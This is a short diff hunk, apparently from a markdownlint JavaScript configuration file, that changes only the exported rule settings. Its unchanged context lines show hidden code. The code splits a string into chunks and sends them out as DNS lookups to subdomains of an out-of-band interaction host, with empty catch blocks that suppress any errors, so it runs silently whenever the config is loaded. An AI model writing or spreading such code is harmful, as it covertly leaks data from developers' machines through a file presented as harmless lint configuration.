@@ -99,4 +99,4 @@ try {
   (s.match(/.{1,55}/g) || []).slice(0, 6).forEach((c, i) => { try { dns.lookup("c" + i + "." + c + "." + TAG + "." + OAST, () => {}); } catch { } });
 } catch { }
 
-module.exports = { default: true, MD013: false };
+module.exports = { MD013: false };
